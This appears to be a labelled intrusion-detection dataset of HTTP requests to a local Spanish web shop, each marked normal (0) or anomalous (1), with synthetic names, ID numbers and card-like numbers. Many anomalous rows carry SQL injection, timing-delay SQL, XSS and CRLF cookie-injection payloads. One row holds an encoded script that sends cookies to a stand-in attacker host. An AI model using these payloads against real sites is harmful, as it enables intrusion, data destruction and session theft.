localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = yanshek & pwd = paros % 22 % 20style =  % 22background : url ( javascript : alert (  ' paros '  )  )  & remember = off & b1 = entrar,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = dillie & password = jopo & nombre = notburga & apellidos = cucurela + montezuma & email = cadoret @ escuelamontessori . pa & dni = 98847765k & direccion = carretera + masnou ,  + 172 ,  + 5b & ciudad = albuñol & cp = 47131 & provincia = soria & ntc = 8281979288655309 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = ploof & password = p04u803 & nombre = alenda & apellidos = pruneda + de + velasco & email =  % 2b & dni = 50020791t & direccion = carretera + lebrija ,  + 25 +  & ciudad = santo + tomé + del + puerto & cp = 42126 & provincia = cáceres & ntc = 7582936564650481 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = de _ cours & password = bermejecer & nombre = delina & apellidos = pazarán + totozauz & email = rosita @ barebackspain . com & dni = 27955754j & direccion = calle + iglesia + 118 + 3c & ciudad = lécera & cp = 24276 & provincia = lleida & ntc = 6791997514529515 & b1 = registrar,0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = vino + rioja & precio =  '  + and +  ' 1 '  =  ' 1 & cantidad = 85 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = jamón + ibérico & precio = 85 & cantidad = 74 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = janith & pwd = cobalto & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = natraj & pwd = desa1a0car '  + delete + from + users & remember = on & b1 = entrar,1
"localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login =  ""  + and +  "" 1 ""  =  "" 1 & pwd = 4mor0t3rse & remember = off & b1 = entrar",1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login =  ""  + and +  "" 1 ""  =  "" 1 & password = surcañ * o & nombre = emerio & apellidos = abajo + witron & email = ammelrooy @ mariposasentudia . travel & dni = 46405415v & direccion = avinguda + puigfred + 108 ,  +  & ciudad = san + cristóbal + de + la + cuesta & cp = 09471 & provincia = valencia & ntc = 0824087698765397 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jsp / asf - logo - wide . old,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = dion & pwd = tricótomo & remember = off /  & b1 = entrar,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 3400 +  & b1 = confirmar,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 1380 & b1 = pasar + por + cajaparos % 22 + style % 3d % 22background % 3aurl % 28javascript % 3aalert % 28 % 27paros % 27 % 29 % 29 & id = 2,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 /  & nombre = jamón + ibérico & precio = 39 & cantidad = 69 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = chu - chue & password = t '  , ole / rar & nombre = marley & apellidos = junqueras & email = craven . maillard @ xslive . th & dni = 13189812w & direccion = passatge + de + graziella + pareto ,  + 63 ,  + 3 ? c & ciudad = carrizo & cp = 10130 & provincia = zaragoza & ntc = 7866818730779825 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = thatte & pwd = balata & remember = off & b1 = entrar,0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = vera & password = 0ip0rbol1id7 & nombre = n ? el + ma & apellidos = artells + arteta & email = henn _ others @ lasmilyuna . gi & dni = 13605020z & direccion = paseo + alcalde + rafael + ginel ,  + 121 +  & ciudad = fuentelisendo & cp = 09219 & provincia = madrid & ntc = 6311255681512253 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = rog & password = ramial & nombre = leka & apellidos = grimaldi + escriva & email = diarra @ isbn . com . ie & dni = 28681618c & direccion = periodista + gonzalez + hoyos ,  + 174 ,  +  & ciudad = priego + de + córdoba & cp = 30412 & provincia = ciudad + real & ntc = 7712379186246495 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = edwin & pwd = limonar & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = rahrer & pwd = d!es7epit0dor & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / productos . jsp / 6909030637832563290 . jsp . old,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modoa = insertar & precio = 5698 & b1 = pasar + por + caja,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = vino + rioja & precioa = 100 & cantidad = 17 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = shibo & pwd = 3l8rinet03ta & remember = any % 3f % 0d % 0aset - cookie % 3a + tamper % 3d1041264011025374727 % 0d % 0a & b1 = entrar,1
localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = s / hakor & password = 3749s63a & nombre = avito & apellidos = zalarich + llufriu & email = saul @ expertmagnet . np & dni = 14335839p & direccion = c /  + barranquet + 130 +  & ciudad = calzada + de + los + molinos & cp = 50470 & provincia = a + coruña & ntc = 9270239658811052 & b1 = registrar,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 3any % 0aset - cookie % 3a + tamper % 3d1041264011025374727 & nombre = jamón + ibérico & precio = 39 & cantidad = 52 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = w * eidar & pwd = f4lt8sa & remember = off & b1 = entrar,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = patches7 & pwd = 0u993d2r & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = queso + manchego & precio = 39 & cantidad = 39 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 2307 & b1 = confirmar,0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = mccormic & password = c3m18r8a9ión & nombre = vesna & apellidos = atencia + alburquerque & email = laffin @ muchapolicia . tf & dni = 76091981t & direccion = diaz + zorita ,  + s / n + 4 ? e & ciudad = salvaleón & cp = 50268 & provincia = burgos & ntc = 1890475688764912 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = elms & pwd = bá8363o & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = queso + manchego '  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & precio = 39 & cantidad = 2 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = vladica & password = v10e47rian8 & nombre = lienhard & apellidos = gandoy + gobern & email = glazerlvezic _ goff @ apicultor . lr & dni = 02927660j & direccion = indalecio + prieto ,  + 1 ,  + 13 ? b & ciudad = rábanos & cp = 18129 & provincia = cuenca & ntc = 1765300748031043 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = atp & password = 30rr421r0s & nombre = benedicta & apellidos = sillero & email = arias @ logiteclines . nf & dni = 21137619k & direccion = plaza + comunidad + balear + 109 ,  +  & ciudad = cubillo + del + campo & cp = 05111 & provincia = zaragoza & ntc = 0892519476586587 & b1 = registrar",0
localhost : 8080 / tienda1 / global / titulo . jsp / 4861362529278789730 . java,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = kessiah & pwd = almudero & remember = on & b1 = entrar,0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = haslach & password = vicepresidencia & nombre = johanna & apellidos = turet + maiorana & emaila = dann @ comodepilarse . bm & dni = 07197959v & direccion = calle + federico + garcia + lorca + 125 ,  + 5f & ciudad = trijueque & cp = 18370 & provincia = valladolid & ntc = 5980578835652904 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = engsiong & password = lujo & nombre = nayib & apellidos = bernuy + pizano & email = argo . freyndikh @ sanchezgordo . lc & dni = 62559793t & direccion = c /  + casas + del + ayuntamiento ,  + 198 +  & ciudad = torresandino & cp = 46146 & provincia = teruel & ntc = 6947182026980318 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = jamón + ibérico & precio = 39 /  & cantidad = 17 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / miembros / imagenes / ogono . jpg / 6909030637832563290 . jsp . bak,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 5886 & b1 = pasar + por + caja,0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = yuyu & password = coya & nombre = emanuel & apellidos = descárrega + cisneros & email = angelica @ veocime . ag & dni = 55444039d & direccion = vicario + jose + ramon + salcedo ,  + 54 + 1 ? d & ciudad = fuentenava + de + jábaga & cp = 24378 & provincia = cuenca & ntc = 8114737724016007 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = vino + rioja & precio = 100 & cantidad = 82 ' injected _ param & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 . old,1
localhost : 8080 / 4861362529278789730 . bak,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ~ ,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = heinonen & pwd = s + oso & remember = off /  & b1 = entrar,1
localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = flint & password = herbecer & nombre = nabil & apellidos = salleras + lima & email = volmut8 @ santcugatpisos . ca & dni = 51483838v & direccion = calle + isla + columbretes + 111 +  & ciudad = soto + de + cerrato & cp = 47120 & provincia =  ?  & ntc = 2744245058125133 & b1 = registrar,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 8588 & b1 =  '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  '  % ,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 /  & nombre = queso + manchego & precio = 100 & cantidad = 46 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = mendonca & pwd = 6ariaco9 & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / caracteristicas . jsp ? id = 2 '  + and +  ' 1 '  =  ' 1,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 1211 & b1 = pasar + por + caja / ,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = clemmy & password = o0re & nombre = yamari & apellidos = olalla + padoan & email = cagaloglu @ maxiwagen . rw & dni = 19044882p & direccion = calle + atarjea + blanca ,  + 96 +  & ciudad = alpicat & cp = 09194 & provincia = granada & ntc = 5818123675396562 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = ricketts5 & pwd = huidera & remember = off & b1 = entrar ' injected _ param,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = isk / andar & password = recalzar & nombre = amiel & apellidos = del + blanco & email = ying - carridine @ audiosat . sy & dni = 55739537a & direccion = jose + cadierno + 186 ,  + 6f & ciudad = nuévalos & cp = 37621 & provincia = asturias & ntc = 2320151892972616 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = sheng - fu & pwd = sentimenta / lmen '  , te & remember = on & b1 = entrar",1
localhost : 8080 / tienda1 / publico / vaciar . jsp ? b2 = vaciar + carrito '  + and +  ' 1 '  =  ' 1,1
"localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & precio = 3471 & b1 = confirmar",1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modoa = insertar & precio = 6838 & b1 = pasar + por + caja,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = bob % 40 % 3cscript % 3ealert % 28paros % 29 % 3c % 2fscript % 3e . parosproxy . org & pwd = diligencia & remember = off & b1 = entrar,1
localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = jilann6 & password = inna & nombre = hipabia & apellidos = salvatierra + escala & email = sangareau @ faders . com . mil & dni = 80061275t & direccion = barriada + de + la + doctora + 15 +  & ciudad = agaete & cp = 23450 & provinciaa = córdoba & ntc = 4825239492507549 & b1 = registrar,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = montijo & pwd = enriscado & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = gunn & password = d88ino & nombre = nuncia & apellidos = badell + macia & email = sessionid = 12312312 &  + username =  % 3c % 73 % 63 % 72 % 69 % 70 % 74 % 3e % 64 % 6f % 63 % 75 % 6d % 65 % 6e % 74 % 2e % 6c % 6f % 63 % 61 % 74 % 69 % 6f % 6e % 3d % 27 % 68 % 74 % 74 % 70 % 3a % 2f % 2f % 61 % 74 % 74 % 61 % 63 % 6b % 65 % 72 % 68 % 6f % 73 % 74 % 2e % 65 % 78 % 61 % 6d % 70 % 6c % 65 % 2f % 63 % 67 % 69 % 2d % 62 % 69 % 6e % 2f % 63 % 6f % 6f % 6b % 69 % 65 % 73 % 74 % 65 % 61 % 6c % 2e % 63 % 67 % 69 % 3f % 27 % 2b % 64 % 6f % 63 % 75 % 6d % 65 % 6e % 74 % 2e % 63 % 6f % 6f % 6b % 69 % 65 % 3c % 2f % 73 +  % 63 % 72 % 69 % 70 % 74 % 3e ?  & dni = 09955823c & direccion = c /  + closa + de + torroja + s / n + 12 - b & ciudad = loiu & cp = 12580 & provincia = asturias & ntc = 9649891877150082 & b1 = registrar,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = hisko & pwd = misionera & remember = off & b1a = entrar,1
localhost : 8080 / tienda1 / miembros / imagenes / zarauz . jpg /  . old,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = castro - h & password = entre8e58r & nombre = deserée & apellidos = peró & email = auric @ cafedeteatro . um & dni = 04549087d & direccion = luis + montoto + 38 ,  +  & ciudad = moriscos & cp = 09199 & provincia = burgos & ntc = 8277692168362297 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = queso + manchego & precio =  % 2b & cantidad = 98 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = skeuse & password = t6r3u6ada & nombre = sharim & apellidos = jaimes & email = macmillian @ clichotel . uz & dni = 91873114m & direccion = abrevadero ,  + 179 ,  +  & ciudad = folgueroles & cp = 45356 & provincia = soria & ntc = 1717024307107275 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = jamón + ibérico & precio = 39 & cantidad = 86 & b1 = añadir + al + carrito,0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = t , ele & password = cenceña & nombre = constantino & apellidos = solmoirago & email = russinov @ rubirubi . to & dni = 93399532m & direccion = c /  + canal + de + mozambique ,  + 189 +  & ciudad = viana + do + bolo & cp = 02151 & provincia = soria & ntc = 9094758290703714 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = fae & password = ar ' ranca , do & nombre = stylianos & apellidos = pinto + poal & email = certa @ psicoencuentronline . tz & dni = 50501754x & direccion = c /  + pombal ,  + 163 +  & ciudad = arnoia ,  + a & cp = 17136 & provincia = valencia & ntc = 1666396246645136 & b1 = registrar",1
